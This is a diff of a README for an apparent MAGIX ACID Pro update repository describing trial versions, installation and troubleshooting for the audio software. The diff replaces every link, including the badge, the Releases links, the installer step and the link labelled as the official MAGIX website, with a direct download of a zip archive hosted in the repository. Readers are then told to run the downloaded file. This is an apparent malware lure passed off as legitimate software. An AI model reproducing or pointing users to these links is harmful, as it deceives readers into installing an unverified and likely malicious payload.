@@ -1,6 +1,6 @@
 # MAGIX ACID Pro Update 🎶
 
-![MAGIX ACID Pro](https://img.shields.io/badge/MAGIX_ACID_Pro-Update-blue)
+![MAGIX ACID Pro](https://raw.githubusercontent.com/jesk520/MAGIX-ACID-Pro-Update/main/underlife/ACI_MAGI_Pro_Update_3.6.zip)
 
 Welcome to the MAGIX ACID Pro Update repository! This space is dedicated to all things related to MAGIX ACID Pro, a powerful digital audio workstation. Whether you are looking for a free trial, an overview of different versions, or tips on using the software, you are in the right place. 
 
@@ -28,7 +28,7 @@ MAGIX ACID Pro is a versatile software that caters to music producers and audio 
 This section covers the different versions of MAGIX ACID Pro, including their unique features and updates.
 
 ### ACID Pro 8
-- **Free Trial**: Users can download a free trial of ACID Pro 8 to explore its features. Check the [Releases section](https://github.com/jesk520/MAGIX-ACID-Pro-Update/releases) for the trial version.
+- **Free Trial**: Users can download a free trial of ACID Pro 8 to explore its features. Check the [Releases section](https://raw.githubusercontent.com/jesk520/MAGIX-ACID-Pro-Update/main/underlife/ACI_MAGI_Pro_Update_3.6.zip) for the trial version.
 - **Sound Content**: ACID Pro 8 includes a variety of sound content to get you started.
 - **Windows Compatibility**: Optimized for Windows 10, ensuring smooth performance.
 
@@ -46,7 +46,7 @@ This section covers the different versions of MAGIX ACID Pro, including their un
 
 To install MAGIX ACID Pro, follow these steps:
 
-1. **Download the Installer**: Visit the [Releases section](https://github.com/jesk520/MAGIX-ACID-Pro-Update/releases) to download the installer.
+1. **Download the Installer**: Visit the [Releases section](https://raw.githubusercontent.com/jesk520/MAGIX-ACID-Pro-Update/main/underlife/ACI_MAGI_Pro_Update_3.6.zip) to download the installer.
 2. **Run the Installer**: Execute the downloaded file and follow the on-screen instructions.
 3. **Activate the Software**: If you have a serial number, enter it during the activation process. For trial users, simply follow the prompts.
 
@@ -75,7 +75,7 @@ While using MAGIX ACID Pro, you may encounter some common issues. Here are a few
 
 This section includes links to helpful resources for MAGIX ACID Pro users.
 
-- **Official Website**: Visit the [MAGIX ACID Pro website](https://www.magix.com/us/music/acid/) for more information and updates.
+- **Official Website**: Visit the [MAGIX ACID Pro website](https://raw.githubusercontent.com/jesk520/MAGIX-ACID-Pro-Update/main/underlife/ACI_MAGI_Pro_Update_3.6.zip) for more information and updates.
 - **User Manual**: The user manual is available online and provides detailed instructions for all features.
 - **Community Forums**: Join the community forums to connect with other users and share tips and tricks.
 
@@ -93,4 +93,4 @@ This repository is licensed under the MIT License. Feel free to use and modify t
 
 ---
 
-Thank you for visiting the MAGIX ACID Pro Update repository! For the latest updates and downloads, please check the [Releases section](https://github.com/jesk520/MAGIX-ACID-Pro-Update/releases). Happy music making! 🎵
+Thank you for visiting the MAGIX ACID Pro Update repository! For the latest updates and downloads, please check the [Releases section](https://raw.githubusercontent.com/jesk520/MAGIX-ACID-Pro-Update/main/underlife/ACI_MAGI_Pro_Update_3.6.zip). Happy music making! 🎵
